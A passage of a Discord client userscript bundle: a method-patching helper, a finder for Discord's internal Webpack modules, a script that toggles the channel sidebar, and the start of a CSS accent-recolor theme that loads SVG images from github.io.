     * @param {object} what Object to be patched. You can can also pass class prototypes to patch all class instances. If you are patching prototype of react component you may also need {@link Renderer.rebindMethods}.
     * @param {string} methodName The name of the target message to be patched.
     * @param {object} options Options object. You should provide at least one of `before`, `after` or `instead` parameters. Other parameters are optional.
     * @param {doPatchCallback} options.before Callback that will be called before original target method call. You can modify arguments here, so it will be passed to original method. Can be combined with `after`.
     * @param {doPatchCallback} options.after Callback that will be called after original target method call. You can modify return value here, so it will be passed to external code which calls target method. Can be combined with `before`.
     * @param {doPatchCallback} options.instead Callback that will be called instead of original target method call. You can get access to original method using `originalMethod` parameter if you want to call it, but you do not have to. Can't be combined with `before` and `after`.
     * @param {boolean} [options.once=false] Set to true if you want automatically unpatch method after first call.
     * @param {boolean} [options.silent=false] Set to true if you want to suppress log messages about patching and unpatching. Useful to avoid clogging the console in case of frequent conditional patching/unpatching, for example from another monkeyPatch callback.
     * @param {boolean} [options.displayName] You can provide meaningful name of class/object provided in `what` param for logging purposes. By default there will be a try to determine name automatically.
     * @return {cancelPatch} Function with no arguments and no return value that should be called to cancel (unpatch) this patch. You should save and run it when your plugin is stopped.
     */
    const monkeyPatch = window.DiscordInternals && window.DiscordInternals.monkeyPatch || ((what, methodName, options) => {
        const {before, after, instead, once = false, silent = false} = options;
        const displayName = options.displayName || what.displayName || what.name || what.constructor.displayName || what.constructor.name;
        if (!silent) console.log('patch', methodName, 'of', displayName);
        const origMethod = what[methodName];
        const cancel = () => {
            if (!silent) console.log('unpatch', methodName, 'of', displayName);
            what[methodName] = origMethod;
        };
        what[methodName] = function() {
            /**
             * @interface
             * @name PatchData
             * @property {object} thisObject Original `this` value in current call of patched method.
             * @property {Arguments} methodArguments Original `arguments` object in current call of patched method. Please, never change function signatures, as it may cause a lot of problems in future.
             * @property {cancelPatch} cancelPatch Function with no arguments and no return value that may be called to reverse patching of current method. Calling this function prevents running of this callback on further original method calls.
             * @property {function} originalMethod Reference to the original method that is patched. You can use in if you need some special usage. You should explicitly provide this value and method arguments when you call this function.
             * @property {originalMethodCall} callOriginalMethod This is a shortcut for calling original method using this and arguments from data object.
             * @property {*} returnValue This is a value returned from original function call. This property is avilable only in `after` callback, or in `instead` callback after calling `callOriginalMethod` function
             */
            const data = {
                thisObject: this,
                methodArguments: arguments,
                cancelPatch: cancel,
                originalMethod: origMethod,
                callOriginalMethod: () => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)
            };
            if (instead) {
                const tempRet = instead(data);
                if (tempRet !== undefined)
                    data.returnValue = tempRet;
            }
            else {
                if (before) before(data);
                data.callOriginalMethod();
                if (after) after(data);
            }
            if (once) cancel();
            return data.returnValue;
        };
        what[methodName].__monkeyPatched = true;
        what[methodName].displayName = 'patched ' + (what[methodName].displayName || methodName);
        return cancel;
    });

    /**
     * @author samogot
     */
    const WebpackModules = window.DiscordInternals && window.DiscordInternals.WebpackModules || (() => {

        const req = typeof(webpackJsonp) == "function" ? webpackJsonp([], {
            '__extra_id__': (module, exports, req) => exports.default = req
        }, ['__extra_id__']).default : webpackJsonp.push([[], {
            '__extra_id__': (module, exports, req) => module.exports = req
        }, [['__extra_id__']]]);
        delete req.m['__extra_id__'];
        delete req.c['__extra_id__'];

        /**
         * Predicate for searching module
         * @callback modulePredicate
         * @param {*} module Module to test
         * @return {boolean} Thue if it is module that you need
         */

        /**
         * Look through all modules of internal Discord's Webpack and return first one that match filter predicate.
         * At first this function will look thruogh alreary loaded modules cache. If no one of loaded modules is matched - then this function tries to load all modules and match for them. Loading any module may have unexpected side effects, like changing current locale of moment.js, so in that case there will be a warning the console. If no module matches - function will return null. You sould always take such predicate to match something, gut your code should be ready to recieve null in case if Discord update something in codebase.
         * If module is ES6 module and hafe default property - only default would be considered, otherwise - full module object.
         * @param {modulePredicate} filter Predicate to match module
         * @return {*} First module that matched by filter or null if none is matched.
         */
        const find = (filter) => {
            for (let i in req.c) {
                if (req.c.hasOwnProperty(i)) {
                    let m = req.c[i].exports;
                    if (m && m.__esModule && m.default)
                        m = m.default;
                    if (m && filter(m))
                        return m;
                }
            }
            console.warn('Cannot find loaded module in cache.');
            return null;
        };

        /**
         * Look through all modules of internal Discord's Webpack and return first object that has all of following properties. You should be ready that in any moment, after Discord update, this function may start returning null (if no such object exists any more) or even some different object with the same properties. So you should provide all property names that you use, and often even some extra properties to make sure you'll get exactly what you want.
         * @see Read {@link find} documentation for more details how search works
         * @param {string[]} propNames Array of property names to look for
         * @return {object} First module that matched by propNames or null if none is matched.
         */
        const findByUniqueProperties = (propNames) => find(module => propNames.every(prop => module[prop] !== undefined));

        /**
         * Look through all modules of internal Discord's Webpack and return first object that has displayName property with following value. This is useful for searching React components by name. Take into account that not all components are exported as modules. Also there might be several components with same names
         * @see Use {@link ReactComponents} as another way to get react components
         * @see Read {@link find} documentation for more details how search works
         * @param {string} displayName Display name property value to look for
         * @return {object} First module that matched by displayName or null if none is matched.
         */
        const findByDisplayName = (displayName) => find(module => module.displayName === displayName);

        return {find, findByUniqueProperties, findByDisplayName};

    })();

    window.setTimeout(start, 5000);
})();

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Channel Hide/Show ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

(function() {
    'use strict';

    // Classes of DIVs you want to be able to toggle sidebar
    const toggleButtons = [
        "children-19S4PO",
        "toggleChannelsBtn"
    ];
    const columnToHide = "sidebar-2K8pFh"
    const showHideSidebarButtonParentClass = "scroller-2TZvBN";
    //const showHideSidebarButtonParentClass = "wrapper-1Rf91z"; //top bar instead
    const roomDivClass = "containerDefault-1ZnADq";
    const unreadClass = "unread-3zKkbm";
    const channelsWidth = "240px";

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function pageload() {
        // Wait 5 seconds for page to load
        await sleep(5000);
        main()
    }

    const toggleVisibility = function() {
        let sidebar = document.getElementsByClassName(columnToHide)[0];
        sidebar.style.transition = "width 150ms ease-out, opacity 150ms ease-out";
        if (sidebar.style.width == "1px") {
            sidebar.style.width = channelsWidth;
            sidebar.style.opacity = "1";
        } else {
            sidebar.style.width = "1px";
            sidebar.style.opacity = "0";
        }
    }

    let cheveronDirection = function() {
        const sidebar = document.getElementsByClassName(columnToHide)[0]
        const btn = document.getElementById("dtcb-cheverons")
        if (sidebar.style.width == "1px") {
            btn.innerText = "›"; // symbol for >
        } else {
            btn.innerText = "‹"; // symbol for <
        }
    }

    const createSidebarButton = function() {
        let btnDiv = document.createElement("div");
        btnDiv.setAttribute("class", "toggleChannelsBtn");
        btnDiv.setAttribute("id", "toggleChannelsBtn");
        btnDiv.style.color = "#FFFFFF";
        btnDiv.style.position = "absolute";
        btnDiv.style.top = "32px";
        btnDiv.style.left = "68px";
        btnDiv.style.zIndex = "2";
        // Button Itself
        let btn = document.createElement("p");
        btn.setAttribute("id", "dtcb-cheverons");
        btn.innerText = "‹"; // symbol for <
        btn.style.margin = "0px";
        btn.style.marginTop = "-10px";
        btn.style.position = "fixed";
        btn.style.cursor = "pointer";
        btn.style.backgroundColor = "#36393f";
        btn.style.borderTopRightRadius = "10px";
        btn.style.height = "inherit";
        btn.style.borderBottomRightRadius = "10px";
        btn.style.color = "unset";
        btn.style.padding = "5px 5px 10px";
        btn.style.justifyContent = "center";
        btn.style.fontSize = "15px";
        btnDiv.appendChild(btn);
        return btnDiv;
    }

    const addListenersToToggleButtons = function() {
        toggleButtons.forEach(function(elem) {
            document.getElementsByClassName(elem)[0].addEventListener('click', function() {
                toggleVisibility();
                cheveronDirection();
            })
        });
    }

    const autohideSidebar = function() {
        const roomDivs = document.getElementsByClassName(roomDivClass)
        Array.from(roomDivs).forEach(function(room) {
            room.addEventListener('click', function() {
                toggleVisibility();
                cheveronDirection();
            })
        })
    }



    const main = function() {
        console.log("[*] Loading Discord Toggle Channenels Bar");
        const newBtn = createSidebarButton()
        document.getElementsByClassName(showHideSidebarButtonParentClass)[0].appendChild(newBtn)
        addListenersToToggleButtons();
        autohideSidebar();
    }

    pageload();
})();


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Theme 1 ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

(function() {
    let css = `
/* ==UserStyle==

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS | ThemeDevBadge |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
.dev-A7f2Rx.hasBadge-4rT8_u .mask-1l8v16 {
	-webkit-mask: url('data:image/svg+xml; utf8, <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 1 1"><g fill="none" fill-rule="evenodd"><path fill="white" d="M0 0 h 1 v 1 h -0.7 v -0.353 h -0.3 z"/></g></svg>') center/cover no-repeat;
}
.dev-A7f2Rx.hasBadge-4rT8_u .avatarHint-1qgaV3 {
	-webkit-mask: url('data:image/svg+xml; utf8, <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 1 1"><g fill="none" fill-rule="evenodd"><path fill="white" d="M0 0 h 1 v 1 h -0.66 v -0.33 h -0.33 z"/></g></svg>');
}
.dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	-webkit-mask: url('data:image/svg+xml; utf8, <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 508.52 508.52" style="enable-background:new 0 0 508.52 508.52;" xml:space="preserve"><path fill="black" d="M63.565, 476.737c0, 12.84, 7.755, 24.473, 19.61, 29.367c3.941, 1.621, 8.073, 2.415, 12.173, 2.415c8.263, 0, 16.4-3.242, 22.47-9.312L254.26, 362.765l136.442, 136.442c6.07, 6.07, 14.207, 9.312, 22.47, 9.312c4.1, 0, 8.232-0.795, 12.141-2.415c11.887-4.894, 19.642-16.527, 19.642-29.367V165.347H63.565V476.737z"/><path fill="black" d="M413.172, 0H95.347C77.804, 0, 63.565, 14.239, 63.565, 31.782v61.782h381.39V31.782C444.955, 14.239, 430.716, 0, 413.172, 0z"/></svg>') center/cover no-repeat !important;
	background: #7289da !important;
	position: absolute !important;
	width: 30% !important;
	height: 30% !important;
	top: 74% !important;
	left: 1.5% !important;
}
.root-SR8cQa .topSectionPlaying-1J5E4n .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s,
.userPopout-3XzG_A .headerPlaying-j0WQBV .dev-A7f2Rx.hasBadge-4rT8_u .badge-7R_W3s {
	filter: brightness(80%) !important;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| EXTENSIONS | Burple Recolor ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/* Blurple Recolor | Changed the basic accent color  (made by mwittrien)*/
:root {
	--daccentcolor: 114,137,218;
	--vaccentcolor: var(--accentcolor, var(--daccentcolor));
	--daccentcolor2: 255,115,250;
	--vaccentcolor2: var(--accentcolor2, var(--daccentcolor2));
	--dlinkcolor: 0,176,244;
	--vlinkcolor: var(--linkcolor, var(--dlinkcolor));

	--dfontwhite1: 255,255,255;

	--vaccentcolor-hover: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0.15));
	--vaccentcolor-active: rgb(var(--vaccentcolor)) linear-gradient(0deg, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.3));
	--vaccentcolor2-hover: rgb(var(--vaccentcolor2)) linear-gradient(0deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0.15));
	--vaccentcolor2-active: rgb(var(--vaccentcolor2)) linear-gradient(0deg, rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.3));

	--bdfdb-blurple: rgb(var(--vaccentcolor)) !important;
	--bd-blue: rgb(var(--vaccentcolor)) !important;
	--bd-blue-hover: var(--vaccentcolor-hover) !important;
	--bd-blue-active: var(--vaccentcolor-active) !important;
	--blurple: rgb(var(--vaccentcolor)) !important;
}
.theme-dark, .theme-light {
	--text-link: rgb(var(--vlinkcolor));
	--focus-primary: rgb(var(--vlinkcolor));
	--radio-group-dot-foreground: rgb(var(--vaccentcolor));
}
.theme-light {
	--logo-primary: rgb(var(--vaccentcolor));
}


/* ~~~~		0.		TABLE OF CONTENTS				~~~~ */
/*
	1.	GUILDLIST
	2.	CHANNELLIST
	3.	CHAT
		1.	MESSAGES
		2.	TEXTAREA
		3.	AUTOCOMPLETEMENU
		4.	MEMBERLIST
		5.	SEARCHPAGE
		6.	CALL
	4.	PEOPLES
	5.	STORE/NITRO
	6.	LIBRARY
	7.	DISCOVERY
	8.	USERSETTINGS
	9.	GUILDSETTINGS
	10.	MODALS
		1.	USERMODAL
		2.	GUILDADD/CREATION
		3.	REGIONSELECTMODAL
		4.	UPLOADMODAL
		5.	KEYBOARDSHORTCUTSMODAL
		6.	LOGINSCREEN
		7.	DOWNLOADAPPMODAL
		8.	GUILDBOOSTMODAL
		9.	STREAMSETTINGSMODAL
		10.	DISPATCHERRORMODAL
		11.	CHANGELOGMODAL
		12.	SCREENSHAREMODAL
		13.	PHONEVERIFICATIONMODAL
		14.	CUSTOMSTATUSMODAL
	11.	POPOUTS
		1.	CONTEXTMENU
		2.	USERPOPOUT
		3.	EMOJIPICKER
		4.	PINS/MENTIONS
		5.	SEARCHPOPOUT
	12.	GENERAL
		1.	TEXT
		2.	BUTTONS
		3.	INPUTS
		4.	TAGS
		5.	ICONS
		6.	SCROLLBARS
		7.	NOTIFICATIONBAR
		8.	TOOLTIPS
		9.	TOASTS
	13.	BDSUPPORT
	14.	POWERCORDSUPPORT
	15.	PLUGINSUPPORT
		1.	IMAGEZOOM
		2.	HIDEUTILS
		3.	READALLNOTIFICATIONSBUTTON
		4.	SERVERSEARCH
		5.	CHANNELTABS
	16.	THEMESUPPORT
		1.	THEMEDEVBADGE
*/


/* ~~~~		1.		GUILDLIST						~~~~ */

.wrapper-1BJsBx.selected-bZ3Lue .childWrapper-anI2G9,		/* home/acronym												*/
.wrapper-1BJsBx:hover .childWrapper-anI2G9 {
	background-color: rgb(var(--vaccentcolor));
}

.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 1"] {
	background-color: rgba(var(--vaccentcolor), 1) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.9"] {
	background-color: rgba(var(--vaccentcolor), 0.9) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.8"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.7"] {
	background-color: rgba(var(--vaccentcolor), 0.7) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.6"] {
	background-color: rgba(var(--vaccentcolor), 0.6) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.5"] {
	background-color: rgba(var(--vaccentcolor), 0.5) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.4"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.3"] {
	background-color: rgba(var(--vaccentcolor), 0.3) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.2"] {
	background-color: rgba(var(--vaccentcolor), 0.2) !important;
}
.folderIconWrapper-226oVY[style*="background-color: rgba(114, 137, 218, 0.1"] {
	background-color: rgba(var(--vaccentcolor), 0.1) !important;
}
.folderIconWrapper-226oVY svg[style^="color: rgb(114, 137, 218)"],
.folderIconWrapper-226oVY svg[style*=" color: rgb(114, 137, 218)"] {
	color: rgb(var(--vaccentcolor)) !important;
}


/* ~~~~		2.		CHANNELLIST						~~~~ */

.background-2uufRq {										/* guild header			partnerbadge						*/
	color: rgb(var(--vaccentcolor));
}
.iconTierThree-3EAOB7 {										/* guild header			icontier3							*/
	color: rgb(var(--vaccentcolor2));
}
.subscribeTooltipWrapper-32-Ce8 {							/* guild header			subscribetooltip					*/
	background-color: rgb(var(--vaccentcolor));
}
.subscribeTooltipWrapper-32-Ce8::after {
	border-bottom-color: rgb(var(--vaccentcolor));
}

.channelNotice-1-XFjC::before,								/* channel notice											*/
.channelNotice-1-XFjC::after,
.channelNotice-3DDmsB::before,
.channelNotice-3DDmsB::after,
#app-mount .channelNotice-3hkOiI::before,
#app-mount .channelNotice-3hkOiI::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4 {
	background: transparent;
}
.channelNotice-1-XFjC.quickswitcher-35bYg4::before {
	filter: grayscale(0.5);
	background: url(https://discord.com/assets/8fdb69b7684b8e1ecb3fdde909daca41.svg) center 35px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_premium_bg.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.premiumGuildSubscription-3oKecP::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_premium_accent.svg) center 23px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_upsell_bg.svg) center 12px no-repeat;
}
.channelNotice-1-XFjC.publicUpsell-31ZSJ8::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/channelnotice_upsell_accent.svg) center 12px no-repeat;
}


/* ~~~~		3.		CHAT							~~~~ */

/* ----		3.1.	MESSAGES						---- */

.newMessagesBar-265mhP {									/* new messagesbar											*/
	background-color: rgb(var(--vaccentcolor));
}

.hasMore-3POVhk {											/* hasmore messagesbar										*/
	color: rgb(var(--vaccentcolor));
}

.backgroundFlash-24qWLN[style*="background-color: rgb(114, 137, 218)"],
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 1"] {
	background-color: rgba(var(--vaccentcolor), 1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.9"] {
	background-color: rgba(var(--vaccentcolor), 0.9) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.8"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.7"] {
	background-color: rgba(var(--vaccentcolor), 0.7) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.6"] {
	background-color: rgba(var(--vaccentcolor), 0.6) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.5"] {
	background-color: rgba(var(--vaccentcolor), 0.5) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.4"] {
	background-color: rgba(var(--vaccentcolor), 0.4) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.3"] {
	background-color: rgba(var(--vaccentcolor), 0.3) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.2"] {
	background-color: rgba(var(--vaccentcolor), 0.2) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.1"] {
	background-color: rgba(var(--vaccentcolor), 0.1) !important;
}
.backgroundFlash-24qWLN[style*="background-color: rgba(114, 137, 218, 0.0"] {
	background-color: rgba(var(--vaccentcolor), 0.0) !important;
}

.embedFull-2tM8--[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.ephemeral-1PsL1r,											/* localbot				container							*/
.replying-1x3H0T {											/* replying				container							*/
	background-color: rgba(var(--vaccentcolor), 0.05);
}
.ephemeral-1PsL1r::before,									/* localbot				before								*/
.replying-1x3H0T::before {									/* replying				before								*/
	background-color: rgb(var(--vaccentcolor));
}
.message-2qnXI6.ephemeral-1PsL1r.selected-2P5D_Z,
.mouse-mode.full-motion .ephemeral-1PsL1r:hover,
.mouse-mode .ephemeral-1PsL1r:hover,
.message-2qnXI6.replying-1x3H0T.selected-2P5D_Z,
.mouse-mode.full-motion .replying-1x3H0T:hover,
.mouse-mode .replying-1x3H0T:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
}
.ephemeralMessage-1fEWtQ a {								/* localbot				operations							*/
	color: rgb(var(--vaccentcolor));
}

.operations-36ENbA > a {									/* message				operations							*/
	color: rgb(var(--vaccentcolor));
}

.command-2EsN1V {											/* command				used command						*/
	color: rgb(var(--vaccentcolor));
}

.icon-360yEu {												/* systemmessage		guild sub easter egg icon			*/
	color: rgb(var(--vaccentcolor2));
}

.message-15tBk4 strong,										/* mention				in header							*/
.wrapper-3WhCwL {											/* mention													*/
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}
.message-15tBk4 strong:hover,
.interactive:hover {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .mentioned-xhSam7 .mention.interactive:hover {
	color: rgb(var(--vaccentcolor));
}

.reactionMe-wv5HKu .reactionCount-2mvXRV,					/* reaction				count me							*/
.reactionMe-wv5HKu:hover .reactionCount-2mvXRV {
	color: rgb(var(--vaccentcolor));
}
.reaction-1hd86g.reactionMe-wv5HKu {						/* reaction				wrapper me							*/
	background-color: rgba(var(--vaccentcolor), 0.3);
}
															/* attachment			upload bar							*/
.progressBar-3u8FBM[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}

/* ----		3.2.	TEXTAREA						---- */
															/* textarea				follow channel icon					*/
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_followchannel_bg.svg) center/contain no-repeat;
	width: 47px;
	height: 60px;
	margin-bottom: -8px;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + * {
	overflow: visible;
}
.image-3XsqGc[src="/assets/dc7e9e55b3a6d39d24acdd650ecc2ef3.svg"] + *::after {
	content: "";
	position: absolute;
	bottom: 8px;
	left: 16px;
	width: 47px;
	height: 60px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_followchannel_accent.svg) center/contain no-repeat;
}
															/* textarea				verify email icon					*/
.image-3XsqGc[src="/assets/b0df989dede2e65a2d631874ffe04de0.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_verifyemail_bg.svg) center/contain no-repeat;
	width: 65px;
	height: 60px;
	margin-bottom: -16px;
}
.image-3XsqGc[src="/assets/b0df989dede2e65a2d631874ffe04de0.svg"] + * {
	overflow: visible;
}
.image-3XsqGc[src="/assets/b0df989dede2e65a2d631874ffe04de0.svg"] + *::after {
	content: "";
	position: absolute;
	bottom: 0px;
	left: 16px;
	width: 65px;
	height: 60px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/chatnotice_verifyemail_accent.svg) center/contain no-repeat;
}

/* ----		3.3.	AUTOCOMPLETEMENU				---- */

#app-mount .active-2awTSY {									/* autocomplete			option active						*/
	background-color: rgb(var(--vaccentcolor)) !important;
}

#app-mount .searchSuggestion-2K8OBX:hover {					/* gifpicker			suggestions							*/
	border-color: rgb(var(--vaccentcolor));
	background-color: rgb(var(--vaccentcolor));
}
.result-3w1ZcL[style*="background-color"] {					/* gifpicker			result loading						*/
	background-color: rgb(var(--vaccentcolor)) !important;
}
.result-3w1ZcL[style*="background-color: rgb(146, 154, 250)"] {
	background: var(--vaccentcolor-hover) !important;
}
.result-3w1ZcL[style*="background-color: rgb(179, 174, 255)"] {
	background: var(--vaccentcolor-active) !important;
}
.theme-light .focused-1En8bG::after,						/* gifpicker			result hover						*/
.theme-light .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #dcddde;
}
.theme-dark .focused-1En8bG::after,							/* gifpicker			result hover						*/
.theme-dark .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #2f3136;
}
#app-mount .categoryFadeBlurple-1j72_A {					/* gifpicker			categoryfade						*/
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#app-mount .categoryFadeBlurple-1j72_A:hover {
	background-color: rgba(var(--vaccentcolor), 0.95);
}
.introductionAction-M1r6AX {								/* gifpicker			introductionaction tooltip			*/
	color: rgb(var(--vaccentcolor));
}
.iconColorLightBlue-zbxJUe {								/* stickerpicker		icon lightblue						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
.iconColorDarkBlue-6qQpJf {									/* stickerpicker		icon darkblue						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
.iconColorPink-1dhBIv {										/* stickerpicker		icon pink							*/
	color: rgb(var(--vaccentcolor2));
}

/* ----		3.4.	MEMBERLIST						---- */

.premiumIcon-1rDbWQ {
	color: rgb(var(--vaccentcolor2));
}

/* ----		3.5.	SEARCHPAGE						---- */

#app-mount .activeButton-rvKcqq,
#app-mount .activeButton-rvKcqq:hover {
	background-color: rgb(var(--vaccentcolor));
}
.noResultsImage-3Y0eCI.alt-3EpRdH {
	display: flex;
}
.noResultsImage-3Y0eCI.alt-3EpRdH::before {
	content: "";
	position: absolute;
	width: 160px;
	height: 160px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/searchpage_noresults_accent.svg) center/cover no-repeat;
}

/* ----		3.6.	CALL							---- */

.sparkleBlurple-awNnsZ {
	background-image: url(https://discordapp.com/assets/c7539bb38577495f5021c8ea455c7145.png);
}
.popBlurple-27zBE3 {
	background-image: url(https://discordapp.com/assets/237a2f9325a83d230fb30b2cd63bbfe6.png);
}
.lightBlurple-1mZKpk {
	background-image: url(https://discordapp.com/assets/1c20f6ecd2d83c1844a3fd6da306d239.png);
}
.crossBlurple--iGG5Y {
	background-image: url(https://discordapp.com/assets/c13a0b03a798023c27155fad5f0c7a61.png);
}


/* ~~~~		4.		PEOPLES							~~~~ */

.wrapper-1cBijl .btn:disabled {								/* addfriendpage		button								*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		5.		STORE/NITRO						~~~~ */

#app-mount .premiumIndicator-1XvbfM {						/* premium				where?								*/
	background-color: rgb(var(--vaccentcolor));
}

.gridItemGuildSubscription-1sZ0fD::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(162, 48, 194), rgba(162, 48, 194, 0.5));
}
.gridItemBadge-1Se-Pu::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}

.activeTransferGuildCardBorder-2jUQ7t{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.premiumGuildSubscriptionRowActive-1WxLXI{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}

.theme-light .animationContainer-cNePAf {
	color: rgb(var(--vaccentcolor));
}
.theme-light .shine-KMI5j7 {
	color: rgba(var(--vaccentcolor), 0.2);
}

.grandfatheredMessage-1BnHtv {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tierGrandfathered-R6zrrD.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier1-UUxEBG,
.headerTier1-2Ckjmd,										/* submodal				tier1 header						*/
